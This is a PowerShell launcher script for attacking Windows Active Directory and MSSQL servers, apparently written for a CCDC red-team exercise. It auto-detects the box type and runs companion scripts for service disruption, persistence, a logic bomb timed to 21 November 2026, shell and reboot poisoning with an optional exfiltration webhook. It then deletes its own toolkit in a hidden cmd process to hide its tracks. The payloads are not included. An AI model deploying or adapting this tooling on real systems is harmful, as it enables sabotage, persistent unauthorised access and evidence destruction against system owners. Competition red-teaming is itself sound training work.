#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Windows Deploy (runs ON target box)
#
# Usage:
#   .\deploy_attack.ps1 deploy  [ad|mssql|auto] [-WebhookUrl "..."]
#   .\deploy_attack.ps1 cleanup [ad|mssql|auto]
#   .\deploy_attack.ps1 bomb    [ad|mssql|auto]
#   .\deploy_attack.ps1 persist [ad|mssql|auto]
#   .\deploy_attack.ps1 disrupt [ad|mssql|auto]
#   .\deploy_attack.ps1 poison  [ad|mssql|auto] [-WebhookUrl "..."]
#   .\deploy_attack.ps1 reboot  [ad|mssql|auto]
#
# Scripts deployed per box type:
#   AD    : 01_disrupt_ad.ps1, 03_persist_ad.ps1, 05_logicbomb.ps1,
#           06_shell_poison.ps1, 07_reboot_poison.ps1
#   MSSQL : 02_disrupt_mssql.ps1, 04_persist_mssql.ps1, 05_logicbomb.ps1,
#           06_shell_poison.ps1, 07_reboot_poison.ps1
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [Parameter(Position=0)][string]$Action   = "deploy",
    [Parameter(Position=1)][string]$BoxType  = "auto",
    [string]$WebhookUrl = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

$DIR = Split-Path -Parent $MyInvocation.MyCommand.Path

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m)
    Write-Host ""
    Write-Host "══════════════════════════════════════════" -ForegroundColor Magenta
    Write-Host "  $m" -ForegroundColor Magenta
    Write-Host "══════════════════════════════════════════" -ForegroundColor Magenta
}

# ── Box detection ─────────────────────────────────────────────────────────────
function Detect-Box {
    if (Get-Service -Name "NTDS" -ErrorAction SilentlyContinue) { return "ad" }
    if (Get-Service | Where-Object { $_.Name -match "^MSSQLSERVER$|^MSSQL\$" }) { return "mssql" }
    return "unknown"
}

if ($BoxType -eq "auto") { $BoxType = Detect-Box }
Write-Info "Detected box type: $BoxType"

# ── Script runner ─────────────────────────────────────────────────────────────
function Invoke-Script {
    param([string]$Script, [string]$Mode, [hashtable]$Extra = @{})
    $path = Join-Path $DIR $Script
    if (-not (Test-Path $path)) {
        Write-Warn "$Script not found -- skipping"
        return
    }
    Write-Host ""
    Write-Host "  ── $Script ──" -ForegroundColor DarkGray
    try {
        & $path $Mode @Extra
    } catch {
        Write-Warn "$Script threw: $_"
    }
}

# ── Deployment ────────────────────────────────────────────────────────────────
Write-Section "System Configuration Manager -- $($Action.ToUpper()) ($BoxType)"

$poisonExtra = @{} ; if ($WebhookUrl) { $poisonExtra['WebhookUrl'] = $WebhookUrl }

switch ($Action) {

    "deploy" {
        switch ($BoxType) {
            "ad" {
                Invoke-Script "01_disrupt_ad.ps1"   "deploy"
                Invoke-Script "03_persist_ad.ps1"   "deploy"
                Invoke-Script "05_logicbomb.ps1"    "deploy"
                Invoke-Script "06_shell_poison.ps1" "deploy" $poisonExtra
            }
            "mssql" {
                Invoke-Script "02_disrupt_mssql.ps1"  "deploy"
                Invoke-Script "04_persist_mssql.ps1"  "deploy"
                Invoke-Script "05_logicbomb.ps1"      "deploy"
                Invoke-Script "06_shell_poison.ps1"   "deploy" $poisonExtra
            }
            default { Write-Err "Unknown box type: $BoxType -- nothing deployed" }
        }
    }

    "cleanup" {
        switch ($BoxType) {
            "ad" {
                Invoke-Script "07_reboot_poison.ps1" "cleanup"
                Invoke-Script "06_shell_poison.ps1"  "cleanup"
                Invoke-Script "05_logicbomb.ps1"     "cleanup"
                Invoke-Script "03_persist_ad.ps1"    "cleanup"
                Invoke-Script "01_disrupt_ad.ps1"    "cleanup"
            }
            "mssql" {
                Invoke-Script "07_reboot_poison.ps1"  "cleanup"
                Invoke-Script "06_shell_poison.ps1"   "cleanup"
                Invoke-Script "05_logicbomb.ps1"      "cleanup"
                Invoke-Script "04_persist_mssql.ps1"  "cleanup"
                Invoke-Script "02_disrupt_mssql.ps1"  "cleanup"
            }
            default { Write-Err "Unknown box type: $BoxType -- nothing cleaned" }
        }
    }

    "bomb" {
        Invoke-Script "05_logicbomb.ps1" "deploy"
    }

    "persist" {
        switch ($BoxType) {
            "ad"    { Invoke-Script "03_persist_ad.ps1"   "deploy" }
            "mssql" { Invoke-Script "04_persist_mssql.ps1" "deploy" }
            default { Write-Err "Unknown box type: $BoxType" }
        }
    }

    "disrupt" {
        switch ($BoxType) {
            "ad"    { Invoke-Script "01_disrupt_ad.ps1"    "deploy" }
            "mssql" { Invoke-Script "02_disrupt_mssql.ps1" "deploy" }
            default { Write-Err "Unknown box type: $BoxType" }
        }
    }

    "poison" {
        Invoke-Script "06_shell_poison.ps1" "deploy" $poisonExtra
    }

    "reboot" {
        Invoke-Script "07_reboot_poison.ps1" "deploy"
    }

    default {
        Write-Err "Unknown action: $Action"
        Write-Host "Usage: .\deploy_attack.ps1 [deploy|cleanup|bomb|persist|disrupt|poison|reboot] [ad|mssql|auto] [-WebhookUrl <url>]"
        exit 1
    }
}

# ── Summary ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Section "SUMMARY"
if ($Action -eq "deploy") {
    Write-Info "Box type : $BoxType"
    Write-Info "Bomb     : 2026-11-21 12:00 CST (hardcoded)"
    if ($WebhookUrl) { Write-Info "Webhook  : set" }
    Write-Host ""
    Write-Info "Wiping attack toolkit from disk..."
    Start-Process "cmd.exe" -ArgumentList "/c timeout /t 2 /nobreak >nul & rmdir /s /q `"$DIR`"" -WindowStyle Hidden
}
Write-Host ""
